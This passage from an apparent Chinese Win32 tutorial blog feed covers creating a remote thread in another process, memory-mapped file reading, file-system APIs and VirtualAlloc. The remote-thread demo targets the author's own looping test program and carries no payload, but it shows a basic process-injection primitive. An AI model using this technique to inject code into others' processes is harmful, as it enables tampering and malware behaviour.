data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwProcId <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getPid Error!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">// 获得进程句柄</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    HANDLE hProcess <span class=\"token operator\">=</span> <span class=\"token function\">OpenProcess</span><span class=\"token punctuation\">(</span>PROCESS_ALL_ACCESS<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwProcId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hProcess <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OpenProcess Error!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    HANDLE hThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateRemoteThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        hProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span><span class=\"token number\">0x007317F0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hThread <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateRemoteThread Error \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token function\">MyRemoteThread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Win2021-7-19.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Win2021-7-19.cpp<br />\n 被创建远程线程的程序</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---------------%d\\n\"</span><span class=\"token punctuation\">,</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc</span><span class=\"token punctuation\">(</span>LPVOID lpParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tHANDLE hThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> ThreadProc<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>创建远程线程前</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>创建远程线程后</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "远程线程函数"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6/",
            "url": "https://self-ferry.github.io/Win%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6/",
            "title": "Win内存映射文件",
            "date_published": "2021-07-13T07:00:44.000Z",
            "content_html": "<p>内存映射文件<br />\n内存映射共享<br />\n写拷贝</p>\n<h1 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MAPPINGNAME</span> <span class=\"token expression\"><span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"共享内存\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>DWORD <span class=\"token function\">MappingFile</span><span class=\"token punctuation\">(</span>LPSTR lpcFile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tHANDLE hFile<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tHANDLE hMapFile<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tDWORD dwFileMapSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tLPVOID lpAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">//1. 得到文件句柄</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\thFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span>LPCWSTR<span class=\"token punctuation\">)</span>lpcFile<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tGENERIC_READ <span class=\"token operator\">|</span> GENERIC_WRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tOPEN_EXISTING<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tFILE_ATTRIBUTE_NORMAL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hFile <span class=\"token operator\">==</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFIle 失败:%d \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token comment\">//2. 创建 FileMapping 对象</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\thMapFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFileMapping</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\thFile<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tPAGE_READWRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\tMAPPINGNAME</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hMapFile <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFileMapping 失败:%d \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token comment\">//3. 映射到虚拟内存</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tlpAddr <span class=\"token operator\">=</span> <span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\thMapFile<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\tFILE_MAP_COPY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpAddr <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MapViewOfFile 失败:%d \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hMapFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token comment\">//4. 读取文件</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tDWORD dwTest1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>PDWORD<span class=\"token punctuation\">)</span>lpAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%#010X \\n\"</span><span class=\"token punctuation\">,</span> dwTest1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token comment\">//5. 写入文件</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token comment\">//*(PDWORD)lpAddr = 0x42424242;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token comment\">// 强制更新缓存</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token comment\">//FlushViewOfFile((PDWORD)lpAddr,4)      </span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token comment\">//6. 关闭资源</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token function\">UnmapViewOfFile</span><span class=\"token punctuation\">(</span>lpAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hMapFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token function\">MappingFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPSTR<span class=\"token punctuation\">)</span><span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"G:\\\\HelloWorld.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pause\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印出文件的前四个字节</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "内存映射文件",
                "内存映射共享",
                "写拷贝"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/",
            "url": "https://self-ferry.github.io/Win%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/",
            "title": "Win文件系统函数",
            "date_published": "2021-07-13T06:58:30.000Z",
            "content_html": "<h1 id=\"什么是文件系统\"><a class=\"anchor\" href=\"#什么是文件系统\">#</a> 什么是文件系统</h1>\n<p>文件系统是操作系统用于管理磁盘上文件的方法和数据结构；简单点说就是在磁盘上如何组织文件的方法。</p>\n<p>文件系统分为 NTFS 和 FAT32。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>EFS 加密：这个加密主要针对当前用户的<br />\n步骤：点击一个文件 -&gt; 文件 -&gt; 属性 -&gt; 高级 -&gt; 加密保护文件内容.</p>\n<p>如果在当前用户则不会有什么结果。但是如果换了用户访问。则不可以访问这个加密文件了</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>加密后</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>磁盘配额：限制其他用户使用硬盘的存储额度。</p>\n<h1 id=\"windows文件系统相关的api\"><a class=\"anchor\" href=\"#windows文件系统相关的api\">#</a> Windows 文件系统相关的 API</h1>\n<h2 id=\"卷相关api\"><a class=\"anchor\" href=\"#卷相关api\">#</a> 卷相关 API</h2>\n<p>&lt;1&gt; 获取卷<br />\n GetLogicalDrives ()</p>\n<p>&lt;2&gt; 获取一个所有卷的盘符的字符串<br />\n GetLogicalDriveStrings ()</p>\n<p>&lt;3&gt; 获取卷的类型<br />\n GetLogicalDriveType ()</p>\n<p>&lt;4&gt; 获取卷信息<br />\n GetVolumeInformation ()</p>\n<h2 id=\"目录相关api\"><a class=\"anchor\" href=\"#目录相关api\">#</a> 目录相关 API</h2>\n<p>&lt;1&gt; 创建目录<br />\n CreateDirectory ();</p>\n<p>&lt;2&gt; 删除目录<br />\n RemoveDirectory ();</p>\n<p>&lt;3&gt; 修改目录名称<br />\n MoveFile ();</p>\n<p>&lt;4&gt; 获取程序当前目录<br />\n GetCurrentDirectory ( );</p>\n<p>&lt;5&gt; 设置程序当前目录<br />\n SetCurrentDirectory ();</p>\n<h2 id=\"文件相关api\"><a class=\"anchor\" href=\"#文件相关api\">#</a> 文件相关 API</h2>\n<p>&lt;1&gt; 创建文件<br />\n CreateFile ();</p>\n<p>&lt;2&gt; 关闭文件的句柄<br />\n CloseHandle ();</p>\n<p>&lt;3&gt; 获取文件长度<br />\n GetFileSize ();</p>\n<p>&lt;4&gt; 获取文件的属性和信息<br />\n GetFileAttributes ()/GetFileAttributesEx ();</p>\n<p>&lt;5&gt; 读 / 写 / 拷 贝 / 删除文件<br />\n ReadFile () witeFile ()/CopyFile ()/DeleteFile ();</p>\n<p>&lt;6&gt; 查找文件<br />\n FindFirstFile ()/FindNextFile ();</p>\n",
            "tags": [
                "Win32",
                "win32文件函数"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E7%A7%81%E6%9C%89%E5%86%85%E5%AD%98%E5%92%8C%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E7%9A%84%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%87%8A%E6%94%BE/",
            "url": "https://self-ferry.github.io/Win%E7%A7%81%E6%9C%89%E5%86%85%E5%AD%98%E5%92%8C%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E7%9A%84%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%87%8A%E6%94%BE/",
            "title": "Win私有内存和共享内存的申请与释放",
            "date_published": "2021-07-13T06:57:41.000Z",
            "content_html": "<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>私有内存：在进程本身的物理页中，只能进程本身使用。<br />\n共享内存：进程都可以使用。</p>\n<h2 id=\"私有内存申请api\"><a class=\"anchor\" href=\"#私有内存申请api\">#</a> 私有内存申请 API</h2>\n<p><code>VirtualAlloc</code> <br />\n <code>virtualAllocEx</code>  在指定进程的虚拟空间保留或提交内存区域</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LPVOID <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    LPVOID lpAddress<span class=\"token punctuation\">,</span>        </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    SIZE_T dwSize<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    DWORD flAllocationType<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    DWORD flProtect</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参数介绍：</p>\n<ol>\n<li>申请内存的地址。可以指定地址，但是物理页我们不知道哪里的地址是否可用，所以一般为 <code>NULL</code> 。</li>\n<li>申请内存的大小。一般以页的整数倍进行申请，如：两页  <code>0x1000*2</code> 。</li>\n<li>申请内存的类型。<br />\n常用的有两种类型：<br />\n <code>MEM_RESERVE</code> : 先申请线性内存，但不占用物理内存<br />\n <code>MEM_COMMIT</code> : 占用线性内存和物理内存。</li>\n<li>内存的状态。可读、可写、可执行。</li>\n</ol>\n<h2 id=\"new-malloc的区别\"><a class=\"anchor\" href=\"#new-malloc的区别\">#</a> new malloc 的区别</h2>\n<p>真正申请内存的其实是 API。而 new 